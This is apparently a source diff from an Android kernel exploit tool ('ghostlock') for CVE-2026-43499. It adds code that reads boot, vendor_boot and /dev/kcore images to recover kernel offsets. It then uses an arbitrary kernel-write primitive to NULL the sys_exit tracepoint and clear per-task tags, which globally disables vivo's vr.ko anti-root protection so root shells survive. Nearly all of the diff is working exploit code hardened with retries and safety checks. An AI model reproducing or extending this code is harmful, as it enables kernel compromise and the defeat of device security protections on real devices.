@@ -12,6 +12,8 @@
 #include "session/backend/cve_2026_43499_backend.hpp"
 
 #include "attack/ops.hpp"
+#include "bootimg/extract.h"
+#include "bootimg/physmap.h"
 #include "common.h"
 #include "kernel/target.h"
 #include "kernelsnitch/utils.h"
@@ -28,6 +30,10 @@
 
 #include <unistd.h>
 
+#include <cstdlib>
+#include <string>
+
+#include <algorithm>
 #include <array>
 #include <cstdint>
 #include <optional>
@@ -53,6 +59,15 @@ namespace ghostlock::session::backend {
              * stage belongs in the log with the address rather than the route */
             if (!attack::in_direct_map(target)) {
                 pr_warning("%s: target 0x%016zx is outside the direct map, not attempting\n", stage, target);
+                return false;
+            }
+            /* The primitive publishes a 64-bit pointer through an rb-tree node, so
+             * the store must land on a pointer slot. A misaligned target would
+             * straddle two fields: the stage would not verify, and the neighbour
+             * field would be corrupted for the rest of the boot. Refusing here
+             * costs one failed stage; not refusing can cost the kernel. */
+            if ((target & 7u) != 0) {
+                pr_warning("%s: target 0x%016zx is not 8-byte aligned, not attempting\n", stage, target);
                 return false;
             }
 
@@ -119,6 +134,222 @@ namespace ghostlock::session::backend {
             victim::VictimContext &pipes = session.victim;
             int32_t &child_alive = chain.child_alive;
 
+            /* ------------------------------------------------------------------
+             * vr1: global vr.ko sys_exit probe kill-switch (PR #241 direction).
+             * Runs before the victim is spawned so the step protocol stays
+             * strictly serial (vr1 -> w2b -> w2a). /proc/modules is probed once
+             * per process; the result is shared with the per-task tag clear in
+             * w2b below. */
+            static int32_t vr_needed = -1;
+            support::run_state::enter("vr1");
+            if (vr_needed < 0) {
+                vr_needed = 1; /* /proc/modules unreadable: assume loaded */
+                if (FILE *m = fopen("/proc/modules", "r")) {
+                    auto close_modules = ghostlock::support::make_scope_exit(
+                        [m]() noexcept { fclose(m); });
+                    std::array<char, 256> mod{};
+                    vr_needed = 0;
+                    while (fgets(mod.data(), static_cast<int32_t>(mod.size()), m)) {
+                        const std::string_view line(mod.data());
+                        /* strncasecmp(mod, "vr", 2): a case-insensitive prefix,
+                         * then the module-name separator. */
+                        const bool vr_prefix =
+                                line.size() >= 2 &&
+                                (line[0] == 'v' || line[0] == 'V') &&
+                                (line[1] == 'r' || line[1] == 'R');
+                        if (vr_prefix && line.size() > 2 &&
+                            (line[2] == ' ' || line[2] == '_')) {
+                            vr_needed = 1;
+                            break;
+                        }
+                    }
+                }
+                pr_info("vr.ko %s\n", vr_needed
+                        ? "loaded; clearing tags"
+                        : "not loaded; skipping tag clear");
+            }
+            if (vr_needed) {
+                /* NULL the sys_exit tracepoint's funcs pointer, profile-gated
+                 * via offset.sys_exit_tp_funcs (0 = not provided = skip).
+                 * __DO_TRACE guards its probe loop with `if (it_func_ptr)`, so
+                 * a NULL funcs pointer turns every sys_exit probe — vr.ko's
+                 * kill path included — into a no-op for every task in the
+                 * system, not just this child. That covers the root shells and
+                 * late-load helpers the rooted child forks later, which the
+                 * per-task clear in w2b cannot reach. Data-only write,
+                 * idempotent, KCFI-safe.
+                 * The original PR #241 proposal redirected individual vr probe
+                 * entries to a probestub through a resident kernel-read
+                 * channel; this tree's primitives are write-only, so the funcs
+                 * *pointer* itself is NULLed instead — no probe address or
+                 * array walk needed. One successful write lasts until reboot;
+                 * the static flag keeps chain retries from repeating it.
+                 * Retried with the W2 rhythm: a single lost race must not
+                 * silently discard the whole global layer. */
+                static int32_t vr_global_done = 0;
+                /* 【新增】vivo/iQOO 设备强制要求 vendor_boot.img 提取动态 VRKO tag 偏移。
+                 * 策略：先从 boot.img 检测品牌，若是 vivo/iQOO 则必须加载 vendor_boot
+                 * 并解析 vr.ko 得到本机 tag A/B；未导入 vendor_boot 时中止攻击，
+                 * 因为回退到固定偏移（0x04/0x06）有极大概率清错字节导致攻击失败。
+                 */
+                /* The app stages a picked boot.img / vendor_boot.img under
+                 * GHOSTLOCK_HOME (= its filesDir); the raw partitions are the
+                 * fallback for a root shell outside the app. */
+                const char* home_dir = getenv("GHOSTLOCK_HOME");
+                std::string staged_boot = home_dir ? std::string(home_dir) + "/boot.img" : std::string();
+                const char* boot_paths_for_brand_check[] = {
+                    staged_boot.empty() ? nullptr : staged_boot.c_str(),
+                    "/dev/block/by-name/boot_a",
+                    "/dev/block/by-name/boot",
+                    "/boot", "/dev/boot", "/oem/boot", "/vendor/boot", nullptr
+                };
+                std::vector<std::uint8_t> boot_data;
+                for (int32_t bp = 0; boot_paths_for_brand_check[bp]; ++bp) {
+                    auto seg_res = ghostlock::bootimg::load_boot_image(boot_paths_for_brand_check[bp]);
+                    if (seg_res.has_value()) {
+                        boot_data.assign(seg_res.value().begin(), seg_res.value().end());
+                        break;
+                    }
+                }
+
+                /* Properties first (authoritative), boot bytes only as fallback. */
+                std::string brand = ghostlock::bootimg::detect_device_brand_runtime(
+                    std::span<const std::uint8_t>(boot_data));
+
+                if (brand == "vivo" || brand == "iqoo") {
+                    pr_info("VR: detected %s device, loading vendor_boot for dynamic VRKO offsets...\n", brand.c_str());
+                    std::string staged_vb = home_dir
+                            ? std::string(home_dir) + "/vendor_boot.img" : std::string();
+                    const char* vendor_boot_paths[] = {
+                        staged_vb.empty() ? nullptr : staged_vb.c_str(),
+                        "/dev/block/by-name/vendor_boot_a",
+                        "/dev/block/by-name/vendor_boot",
+                        "/vendor/boot", "/dev/vendor_boot", "/oem/vendor_boot", nullptr
+                    };
+                    std::vector<std::uint8_t> vendor_boot_data;
+                    for (int32_t vp = 0; vendor_boot_paths[vp]; ++vp) {
+                        auto vb_res = ghostlock::bootimg::load_boot_image(vendor_boot_paths[vp]);
+                        if (vb_res.has_value()) {
+                            vendor_boot_data.assign(vb_res.value().begin(), vb_res.value().end());
+                            pr_success("VR: loaded vendor_boot from %s\n", vendor_boot_paths[vp]);
+                            break;
+                        }
+                    }
+
+                    if (vendor_boot_data.empty()) {
+                        /* Not fatal: the per-task clear below still runs with the
+                         * built-in offset, which succeeds only when this kernel
+                         * family happens to use it. */
+                        pr_warning("VR: %s device without vendor_boot.img; "
+                                   "vr.ko tag offsets stay at the built-in defaults\n",
+                                   brand.c_str());
+                        pr_warning("VR: import vendor_boot.img to parse the real "
+                                   "offsets, otherwise the run will likely fail\n");
+                    } else {
+                        const ghostlock::bootimg::VrKoProbeResult vrko_res =
+                            ghostlock::bootimg::probe_vrko_from_vendor_boot(
+                                std::span<const std::uint8_t>(vendor_boot_data));
+                        if (vrko_res.valid) {
+                            pr_success("VR: recovered tag_A=0x%lx tag_B=0x%lx from %s\n",
+                                       static_cast<unsigned long>(vrko_res.tag_a_offset),
+                                       static_cast<unsigned long>(vrko_res.tag_b_offset),
+                                       vrko_res.module_path.c_str());
+                            /* The per-task clear below writes at the compiled
+                             * VR_TAG_B_OFF. Every measured family uses 0x2c, so a
+                             * module reporting something else is a variant nobody
+                             * has measured: say so rather than clearing a byte pair
+                             * at the wrong offset in silence. */
+                            if (vrko_res.tag_b_offset != static_cast<std::uint64_t>(VR_TAG_B_OFF)) {
+                                pr_warning("VR: module tags at 0x%lx but this build clears 0x%x; "
+                                           "rebuild with -DVR_TAG_B_OFF=0x%lx if the run fails\n",
+                                           static_cast<unsigned long>(vrko_res.tag_b_offset),
+                                           static_cast<unsigned>(VR_TAG_B_OFF),
+                                           static_cast<unsigned long>(vrko_res.tag_b_offset));
+                            }
+                        } else {
+                            /* The probe reports which step failed so the user can act
+                             * on it (wrong image, module absent, unknown variant). */
+                            pr_warning("VR: vendor_boot present but no vr.ko offsets: %s\n",
+                                       vrko_res.error_msg.c_str());
+                            pr_warning("VR: per-task clear stays on the built-in defaults\n");
+                        }
+                    }
+                } else {
+                    pr_info("VR: device brand=%s, vendor_boot VRKO detection skipped (non-vivo/iQOO)\n", brand.c_str());
+                }
+
+                uintptr_t tp_funcs = ghostlock::profile::sys_exit_tp_funcs();
+                /* Profile-gated fallback: when sys_exit_tp_funcs is not baked into
+                 * the HOCON profile, recover it at runtime from the kernel's
+                 * embedded kallsyms + BTF. This keeps the vr1 global kill-switch
+                 * functional on any boot.img without a per-release profile. */
+                if (!tp_funcs) {
+                    pr_info("VR: sys_exit_tp_funcs not in profile; trying bootimg extraction\n");
+                    const char *boot_paths[] = {
+                        "/boot", "/dev/kcore", "/oem/boot", "/vendor/boot", nullptr
+                    };
+                    for (int32_t p = 0; boot_paths[p]; ++p) {
+                        auto seg_res = ghostlock::bootimg::load_boot_image(boot_paths[p]);
+                        if (!seg_res.has_value()) continue;
+                        auto val = ghostlock::bootimg::recover_sys_exit_tp_funcs(
+                            std::span<const std::uint8_t>(seg_res.value()));
+                        if (val.has_value()) {
+                            tp_funcs = *val;
+                            pr_success("VR: recovered sys_exit_tp_funcs=0x%lx from %s\n",
+                                       tp_funcs, boot_paths[p]);
+                            break;
+                        }
+                    }
+                    if (!tp_funcs) {
+                        pr_warning("VR: sys_exit_tp_funcs recovery failed; "
+                                   "falling back to per-task clear only\n");
+                    }
+                }
+                if (!vr_global_done && tp_funcs) {
+                    /* One bad profile entry (or a boot image parsed at the wrong
+                     * base) would zero eight bytes of unrelated kernel data here,
+                     * and the tracepoint would then read a half-cleared pointer.
+                     * Both cases are refused, not retried: the per-task clear
+                     * below still carries the bypass on its own. */
+                    if (!attack::in_direct_map(tp_funcs) || (tp_funcs & 7u) != 0) {
+                        pr_warning("VR: sys_exit funcs target 0x%016zx rejected "
+                                   "(outside the direct map or misaligned); "
+                                   "relying on the per-task clear\n", tp_funcs);
+                        tp_funcs = 0;
+                    }
+                }
+                if (!vr_global_done && tp_funcs) {
+                    const memory::WriteRequest tp_request = memory::WriteRequest::make(
+                        tp_funcs, memory::WriteMode::Zero, 1);
+                    /* Each attempt re-runs the heap spray, and the spray is the
+                     * panic-prone part of the primitive. The global kill-switch is
+                     * an optimisation, not a requirement: a miss leaves the
+                     * per-task clear doing the work, as on every device without a
+                     * profile entry. So this loop is capped well below the W2
+                     * retry budget instead of inheriting it. */
+                    const uint32_t tp_attempts =
+                        std::min<uint32_t>(g_exploit_session.profile.w2_attempts(), 2u);
+                    for (uint32_t attempt = 1; attempt <= tp_attempts; attempt++) {
+                        if (attempt > 1) {
+                            pr_warning("VR: sys_exit tp write %u missed; backing off\n",
+                                       attempt);
+                            usleep(100000);
+                        }
+                        if (Cve2026_43499Policy::template attack_write<M>(
+                                session, tp_request, "VR: sys_exit tp")) {
+                            vr_global_done = 1;
+                            usleep(g_exploit_session.profile.w2_settle_us());
+                            pr_success("VR.ko sys_exit probes disabled globally\n");
+                            break;
+                        }
+                    }
+                    if (!vr_global_done) {
+                        pr_warning("VR: global disable missed; relying on per-task clear\n");
+                    }
+                }
+            }
+            support::run_state::complete("vr1");
+
             const auto spawned = victim::spawn_victim(pipes);
             if (!spawned) {
                 pr_warning("fork failed\n");
@@ -146,9 +377,10 @@ namespace ghostlock::session::backend {
             /* ------------------------------------------------------------------
          * vivo vr.ko anti-root per-task bypass (ported from root.c)
          * ------------------------------------------------------------------
-         * Always compiled: the /proc/modules probe below decides at runtime
-         * whether the writes run. The tag-B offset is overridable at build time
-         * (profile/macros.h), not gated by a define.
+         * Always compiled: the vr_needed probe ran in the vr1 step above, so
+         * these writes only run when vr.ko is actually loaded. The tag-B
+         * offset is overridable at build time (profile/macros.h), not gated
+         * by a define.
          *
          * vr.ko tags every app-origin task at fork/clone time. When the task
          * later holds euid 0, the sys_exit tracepoint probe kills it. We must
@@ -164,50 +396,70 @@ namespace ghostlock::session::backend {
          * ------------------------------------------------------------------ */
             support::run_state::enter("w2b");
             {
-                static int32_t vr_needed = -1;
-                if (vr_needed < 0) {
-                    vr_needed = 1; /* /proc/modules unreadable: assume loaded */
-                    if (FILE *m = fopen("/proc/modules", "r")) {
-                        auto close_modules = ghostlock::support::make_scope_exit(
-                            [m]() noexcept { fclose(m); });
-                        std::array<char, 256> mod{};
-                        vr_needed = 0;
-                        while (fgets(mod.data(), static_cast<int32_t>(mod.size()), m)) {
-                            const std::string_view line(mod.data());
-                            /* strncasecmp(mod, "vr", 2): a case-insensitive prefix,
-                             * then the module-name separator. */
-                            const bool vr_prefix =
-                                    line.size() >= 2 &&
-                                    (line[0] == 'v' || line[0] == 'V') &&
-                                    (line[1] == 'r' || line[1] == 'R');
-                            if (vr_prefix && line.size() > 2 &&
-                                (line[2] == ' ' || line[2] == '_')) {
-                                vr_needed = 1;
-                                break;
-                            }
-                        }
-                    }
-                    pr_info("vr.ko %s\n", vr_needed
-                            ? "loaded; clearing tags"
-                            : "not loaded; skipping tag clear");
-                }
-
                 int32_t vr_ok = 1;
-                if (vr_needed) {
-                    /* 1) Clear thread_info.flags word (covers tag A + tracepoint bit) */
+                /* A missed perf leak can hand back a non-zero task pointer that
+                 * lies outside the direct map; the 64-bit zeroing writes below
+                 * would then corrupt unrelated memory and panic. Refuse the whole
+                 * clear instead of writing at a guessed address. */
+                const bool task_writable = vr_needed != 0 && attack::in_direct_map(child_task);
+                if (vr_needed && !task_writable) {
+                    pr_warning("VR: child_task 0x%016zx rejected (outside the direct map); "
+                               "skipping tag clear\n", child_task);
+                }
+                if (task_writable) {
+                    /* 1) Clear thread_info.flags word (covers tag A + tracepoint bit).
+                     * Same retry rhythm as W2: a single lost race used to leave the
+                     * victim tagged, and the first getuid() of W2 verify would then
+                     * get it killed, burning a whole chain round. */
+                    const uint32_t vr_attempts = g_exploit_session.profile.w2_attempts();
                     const memory::WriteRequest flags_request = memory::WriteRequest::make(
                         child_task + kernel::TASK_THREAD_INFO_FLAGS_OFF, memory::WriteMode::Zero, 1);
-                    vr_ok &= Cve2026_43499Policy::template attack_write<M>(session, flags_request, "VR: flags+tagA");
+                    for (uint32_t attempt = 1; attempt <= vr_attempts; attempt++) {
+                        if (attempt > 1) {
+                            pr_warning("VR: flags+tagA write %u missed; backing off\n",
+                                       attempt);
+                            usleep(100000);
+                        }
+                        if (Cve2026_43499Policy::template attack_write<M>(
+                                session, flags_request, "VR: flags+tagA")) {
+                            vr_ok = 1;
+                            break;
+                        }
+                        vr_ok = 0;
+                    }
 
-                    /* 2) Clear tag B (64-bit aligned down). Belt-and-suspenders. */
+                    /* 2) Clear tag B (64-bit aligned down). Belt-and-suspenders.
+                     * vr.ko treats an out-of-sync tag pair (one set, one clear)
+                     * as tampering and kills on that alone, so this write must
+                     * land too — it gets the same retry loop. */
                     if (vr_ok) {
+                        /* vr1 may have parsed the real tag offsets from
+                         * vendor_boot.img and logged them above; this write still
+                         * uses the build-time VR_TAG_B_OFF on purpose. Feeding the
+                         * parsed value in here changes an attack-path address, so
+                         * it needs the cmp_disasm + device-gate verification that
+                         * a pure logging change does not. */
                         uintptr_t tagb_align = (child_task + VR_TAG_B_OFF) & ~7ULL;
                         const memory::WriteRequest tagb_request =
                                 memory::WriteRequest::make(tagb_align, memory::WriteMode::Zero, 1);
-                        vr_ok &= Cve2026_43499Policy::template attack_write<M>(session, tagb_request, "VR: tagB");
+                        for (uint32_t attempt = 1; attempt <= vr_attempts; attempt++) {
+                            if (attempt > 1) {
+                                pr_warning("VR: tagB write %u missed; backing off\n",
+                                           attempt);
+                                usleep(100000);
+                            }
+                            if (Cve2026_43499Policy::template attack_write<M>(
+                                    session, tagb_request, "VR: tagB")) {
+                                break;
+                            }
+                            vr_ok = 0;
+                        }
                     }
 
                     if (vr_ok) {
+                        /* Let both writes land before W2 verify runs the child's
+                         * getuid() through the syscall exit path. */
+                        usleep(g_exploit_session.profile.w2_settle_us());
                         pr_success("VR.ko per-task tags cleared\n");
                     } else {
                         pr_warning("VR.ko tag clear failed; child may be killed during W2 verify\n");
@@ -422,6 +674,59 @@ namespace ghostlock::session::backend {
     } // namespace
 
     /* Stage: process setup and profile installation. */
+    /* Physical-base cross-check.
+     *
+     * Every image offset the exploit writes is translated through the resolved
+     * physical load base, so a wrong base silently moves all of them: the writes
+     * land in unrelated kernel memory, which is how a tuned run ends in a panic
+     * instead of a missed attempt. The app stages the firmware image it used for
+     * profile extraction, so the runtime can confirm the value it is about to
+     * trust. Only a *parsed* value counts -- an image carrying no kernel entry
+     * has no opinion, and MediaTek's xbl_config derivation stays with the Rust
+     * extractor, which owns that format.
+     *
+     * A contradiction with a profile-provided base refuses the run (nothing has
+     * been written yet); a contradiction with the SoC-formula fallback is a
+     * warning, because then the profile never claimed a value. */
+    bool phys_base_conflict(const ExploitSession &session) {
+        const char *home = getenv("GHOSTLOCK_HOME");
+        if (!home || !home[0]) return false;
+        const std::string staged = std::string(home) + "/uefi.img";
+        auto blob = ghostlock::bootimg::load_boot_image(staged.c_str());
+        if (!blob.has_value()) return false;
+        const auto from_image = ghostlock::bootimg::kernel_phys_load_from_uefi(
+            std::span<const std::uint8_t>(blob.value()));
+        if (!from_image.has_value()) return false;
+
+        const auto resolved = static_cast<unsigned long long>(session.addresses.phys_load());
+        const auto documented = static_cast<unsigned long long>(*from_image);
+        if (resolved == documented) {
+            pr_info("phys base 0x%llx confirmed against the staged uefi.img\n",
+                    documented);
+            return false;
+        }
+
+        const auto *values = session.profile.values();
+        const auto provided = static_cast<unsigned long long>(
+            values ? values->misc.kernel_phys_load.value_or(0) : 0);
+        if (provided != 0) {
+            pr_error("phys base mismatch: profile says 0x%llx, uefi.img says 0x%llx\n",
+                     provided, documented);
+            pr_error("refusing to run: every image offset would be translated "
+                     "through the wrong base\n");
+            pr_error("re-extract the profile with this uefi.img attached, or unset "
+                     "kernel_phys_load\n");
+            pr_error("if the staged uefi.img belongs to another firmware, remove "
+                     "%s/uefi.img and run again\n", home);
+            return true;
+        }
+
+        pr_warning("phys base 0x%llx comes from the SoC formula; the staged "
+                   "uefi.img says 0x%llx\n", resolved, documented);
+        pr_warning("attach uefi.img when extracting the profile to pin the value\n");
+        return false;
+    }
+
     StageResult Cve2026_43499Policy::run_setup(ExploitSession &session,
                                                const profile::kernel_offsets &decoded,
                                                const char *debug_dir, bool force_attack) {
@@ -439,6 +744,7 @@ namespace ghostlock::session::backend {
             config::runtime_config_snapshot().debug_dir = debug_dir;
         if (!session.profile.loaded())
             attack::install_profile(decoded);
+        if (phys_base_conflict(session)) return StageResult::Failed;
         /* Robustness guard: running the attack where KernelSU already owns root
          * drives the re-enforce path that panics the kernel at the first PI
          * route, and the objective is already met. Bail out cleanly instead; a
